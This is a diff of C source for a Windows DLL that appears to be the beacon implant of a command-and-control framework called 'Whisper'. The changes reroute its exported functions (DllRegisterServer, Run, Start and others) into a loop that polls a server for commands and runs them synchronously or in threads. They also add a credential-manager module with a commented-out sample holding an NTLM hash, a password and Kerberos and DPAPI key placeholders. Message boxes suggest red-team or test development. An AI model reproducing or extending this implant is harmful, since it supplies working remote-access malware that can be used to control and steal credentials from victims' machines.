@@ -5,14 +5,16 @@
 #include "whisper_json.h"
 #include "whisper_winapi.h"
 #include "whisper_dynamic_config.h"
-#include <windows.h>
-#include <stdio.h>
-#include <stdint.h>
+#include "whisper_credmanager.h"
 #include <time.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <windows.h> 
 // Function prototype
-DWORD WINAPI BeaconLoop();
-DWORD WINAPI execute_async(char * agent_id);
-void generate_uuid4(char *);
+// int execute();
+DWORD execute(char * agent_id);
+void generate_uuid4(char* agent_id);
+void execution_setup(char* agent_id);
 // Standard Exported Functions
 
 //note: The thread allows for the functions to detach/return okay, makes it more normal + cleaner
@@ -23,17 +25,13 @@ void generate_uuid4(char *);
 //COM
 __declspec(dllexport) HRESULT DllRegisterServer() {
     MessageBox(NULL, "Executed via DllRegisterServer!", "DLL Execution", MB_OK);
-    //HANDLE thread = WhisperCreateThread(NULL, 0, BeaconLoop, NULL, 0, NULL);
-    //if (thread) CloseHandle(thread);
-    BeaconLoop();
+    main();
     return S_OK;
 }
 //COM
 __declspec(dllexport) HRESULT DllUnregisterServer() {
     MessageBox(NULL, "Executed via DllUnregisterServer!", "DLL Execution", MB_OK);
-    //HANDLE thread = WhisperCreateThread(NULL, 0, BeaconLoop, NULL, 0, NULL);
-    //if (thread) CloseHandle(thread);
-    BeaconLoop();
+    main();
     return S_OK;
 }
 
@@ -42,16 +40,14 @@ __declspec(dllexport) HRESULT DllUnregisterServer() {
 // Other options
 __declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
     MessageBox(NULL, "Executed via Run!", "DLL Execution", MB_OK);
-    //HANDLE thread = WhisperCreateThread(NULL, 0, BeaconLoop, NULL, 0, NULL);
-    //if (thread) CloseHandle(thread);
-    BeaconLoop();
+    main();
 }
 // Other options
 __declspec(dllexport) void Start() {
     MessageBox(NULL, "Executed via Start!", "DLL Execution", MB_OK);
     //HANDLE thread = WhisperCreateThread(NULL, 0, BeaconLoop, NULL, 0, NULL);
     //if (thread) CloseHandle(thread);
-    BeaconLoop();
+    main();
 }
 
 
@@ -76,33 +72,73 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
 }
 
 
-// Main beacon loop (runs in a separate thread)
-DWORD WINAPI BeaconLoop() 
-{
+
+int main() {
+
+
     DEBUG_LOG("STARTING");
 
     char agent_id[37];
     generate_uuid4(agent_id);
 
+    initialize_critical_sections();
+
+    // Example of setting the execution mode (you can do this at any point in your code)
+    set_execution_mode(EXEC_MODE_SYNC);  // Initially run synchronously
 
     while (1) {
+        execution_setup(agent_id); // Call the command execution function
 
-        // Create thread
-        HANDLE thread = WhisperCreateThread(NULL, 0, execute_async, agent_id, 0, NULL);
+        //WhisperSleep(get_sleep_time());
+        WhisperSleep(10 * 60);
+
+    }
+
+    return 0;
+}
+
+// Function to execute the command (switching logic)
+void execution_setup(char* agent_id) {
+    // ... command checking logic (when you implement it) ...
+
+    switch (g_execution_mode) {
+    case EXEC_MODE_ASYNC: {
+        DEBUG_LOG("ASYNC\n");
+
+        // Asynchronous execution (new thread)
+        HANDLE thread = WhisperCreateThread(NULL, 0, execute, agent_id, 0, NULL);
         if (thread) {
-            CloseHandle(thread); // Let the thread clean itself up
+            CloseHandle(thread); // Detach the thread
         } else {
             DEBUG_LOG("Failed to create thread.\n");
-
         }
-        // Sleep for X seconds before running the next loop, gets time from get_sleep_time()
-        WhisperSleep(get_sleep_time());
+        break;
+    }
+    case EXEC_MODE_SYNC: {
+        DEBUG_LOG("SYNC/INLINE\n");
+        execute(agent_id); // Call the function directly
+        break;
+    }
+    default:
+        DEBUG_LOG("Invalid execution mode.\n");
+        break;
     }
 }
 
-// Thread function for executing commands asynchronously
-DWORD WINAPI execute_async(char * agent_id)
+
+
+// Thread function for executing the command 
+DWORD WINAPI execute(char * agent_id)
 {
+
+    //bug somewhere in here. yay
+    // add_credential("admin", "CORP", 
+    //             "31d6cfe0d16ae931b73c59d7e0c089c0", NULL, "P@ssw0rd!",
+    //             "base64-KerbTGT", "aes128-key", "aes256-key",
+    //             "dpapi-master-key");
+
+    
+    // display_credentials();
 
     //this fills in the command, arg and command_id
     InboundJsonDataStruct InboundJsonData = get_command_data(agent_id);
@@ -148,11 +184,15 @@ DWORD WINAPI execute_async(char * agent_id)
 
     //Outbound freeing. Only need to free if using a func that allocates memory to a strucutre member
     free(OutboundJsonData->agent_id); //freed due to 'OutboundJsonData->agent_id = strdup(agent_id);' line.
+    free(OutboundJsonData->command_result_data); //freeing due to set_response_data function in whipser_commands.h
     free(OutboundJsonData); // freeing the strucutre itself: 'OutboundJsonDataStruct* OutboundJsonData = (OutboundJsonDataStruct*)calloc(1, sizeof(OutboundJsonDataStruct));'
 
 
     return 0;
 }
+
+
+
 
 void generate_uuid4(char* uuid) {
     uint8_t bytes[16];
@@ -172,7 +212,7 @@ void generate_uuid4(char* uuid) {
     bytes[8] = (bytes[8] & 0x3F) | 0x80;
 
     // Format UUID as a string
-    sprintf(uuid,
+    sprintf_s(uuid, 37,
         "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
         bytes[0], bytes[1], bytes[2], bytes[3],
         bytes[4], bytes[5],
@@ -181,3 +221,4 @@ void generate_uuid4(char* uuid) {
         bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15]
     );
 }
+
